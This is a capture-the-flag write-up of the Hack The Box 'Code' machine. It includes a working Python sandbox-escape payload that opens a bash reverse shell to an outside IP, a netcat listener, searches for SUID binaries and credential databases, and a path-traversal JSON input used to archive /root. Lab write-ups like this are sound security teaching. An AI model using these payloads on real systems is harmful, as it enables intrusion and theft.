---
title: Hack The Box - Code (2025) Writeup
date: 2025-08-01 18:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Code
  - Python
  - RCE
  - Privilege Escalation
  - Path Traversal
---

# Code (Hack The Box) - 2025

> "When a box gives you a code editor, sometimes you just have to get creative."

---

## 1. Recon: Scanning for Opportunity

As always, I started with a thorough Nmap scan to map out the attack surface:

```bash
nmap -sV -A code.htb
```

Demo output:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
```

- **22/tcp**: SSH
- **5000/tcp**: Python web server (Werkzeug) — likely a Flask app

---

## 2. Web App: The Python Code Editor

Browsing to port 5000, I found a web-based Python code editor. It allowed code execution, but with restrictions: many dangerous built-ins and modules were blacklisted.

> *Tip: When a CTF box gives you a code editor, think outside the box. Restrictions are often bypassable with Python's flexibility.*

### Bypassing Restrictions with Classes

Remembering tricks from previous CTFs, I used Python's class-based introspection to access forbidden functionality. By leveraging `__class__`, `__mro__`, and `__subclasses__()`, I could reach `os.popen` and spawn a reverse shell.

Example payload:

```python
import socket,subprocess,os
class A: pass
os = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0].__init__.__globals__['os']
os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.46/4444 0>&1"')
```

- Started a netcat listener on my machine:

```bash
nc -lvnp 4444
```

- Submitted the payload and got a shell as the web app user.

---

## 3. Privilege Escalation: SUID and Database Hunting

With a foothold, I checked for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Found some standard SUID binaries, but nothing immediately useful.

Next, I searched for databases or sensitive files:

```bash
find / -type f -name '*.db' 2>/dev/null
```

- Discovered a database file containing user credentials.
- Used the credentials to log in as a higher-privileged user.

---

## 4. Root: The "backy" Binary and Path Traversal

As the new user, I searched again for SUID/root executables and found a custom binary called `backy`.

- Running `backy` required a JSON input file specifying folders to back up and a destination.
- A sample file was present:

```json
{
  "destination": "/tmp/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/user"
  ]
}
```

- The binary restricted backups to `home` and `var` directories, but I suspected path traversal might work.

### Exploiting Path Traversal

I modified the input file:

```json
{
  "destination": "/tmp/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/user/../../root"
  ]
}
```

- Ran `backy` with the crafted file:

```bash
./backy backup.json
```

- Success! The `/root` directory was archived to `/tmp/`. Inside, I found `root.txt` and claimed the flag.

---

## 5. Lessons Learned

- **Python code editors are rarely secure — introspection is your friend.**
- **Path traversal is a classic, but still effective, especially in custom binaries.**
- **Never trust user input, even in backup tools.**

> "Every CTF box is a new puzzle, but the old tricks never die."

---

*This writeup is for educational purposes only. Always hack responsibly.* 